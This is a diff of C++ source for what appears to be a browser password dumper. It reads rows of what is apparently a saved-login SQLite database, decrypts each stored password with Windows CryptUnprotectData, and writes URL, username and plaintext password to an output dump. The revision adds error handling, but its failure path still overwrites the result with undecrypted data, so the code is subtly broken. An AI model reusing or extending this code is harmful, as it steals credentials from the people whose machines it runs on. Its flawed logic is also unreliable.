@@ -35,43 +35,46 @@ stringstream getPass(
 	rc = sqlite3_step(pStmt);
 	cout << "RC: " << rc << endl;
 	while (rc == SQLITE_ROW) {
-		dump << sqlite3_column_text(pStmt, 0) << endl;
-		dump << (char *)sqlite3_column_text(pStmt, 1) << endl;
+		string decrypted("<failed>");
 
 		DATA_BLOB encryptedPass, decryptedPass;
 
-		encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
-		encryptedPass.pbData = (byte *)malloc((int)encryptedPass.cbData);
+		try {
+			encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
+			encryptedPass.pbData = (byte *)malloc((int)encryptedPass.cbData);
 
-		memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);
+			memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);
 
-		SetLastError(0);
-		BOOL result = CryptUnprotectData(
-			&encryptedPass, // In Data
-			NULL,			// Optional ppszDataDescr: pointer to a string-readable description of the encrypted data 
-			NULL,           // Optional entropy
-			NULL,           // Reserved
-			NULL,           // Here, the optional
-							// prompt structure is not
-							// used.
-			0,
-			&decryptedPass);
+			SetLastError(0);
+			BOOL result = CryptUnprotectData(
+				&encryptedPass, // In Data
+				NULL,			// Optional ppszDataDescr: pointer to a string-readable description of the encrypted data 
+				NULL,           // Optional entropy
+				NULL,           // Reserved
+				NULL,           // Here, the optional
+								// prompt structure is not
+								// used.
+				0,
+				&decryptedPass);
 
-		std::string strFailed("<failed>");
-		if (!result)
+			std::string strFailed("<failed>");
+			if (!result)
+			{
+				std::stringstream temp;
+				temp << "<failed 0x" << std::hex << result << ">";
+				decrypted = temp.str();
+			}
+
+			decrypted = string((char *)decryptedPass.pbData, decryptedPass.cbData);
+		}
+		catch (...)
 		{
-			std::stringstream temp;
 
-			temp << "<failed> temp=0x" << std::hex << result;
-
-			strFailed = temp.str();
 		}
 
-		const char *c = result? (const char *)decryptedPass.pbData: strFailed.c_str();
-		while (isprint(*c)) {
-			dump << *c;
-			c++;
-		}
+		dump << "Url     :" << sqlite3_column_text(pStmt, 0) << endl;
+		dump << "Username:" << (char *)sqlite3_column_text(pStmt, 1) << endl;
+  	    dump << "Password:" << decrypted << endl;
 		dump << endl;
 		dump << endl;
 		rc = sqlite3_step(pStmt);
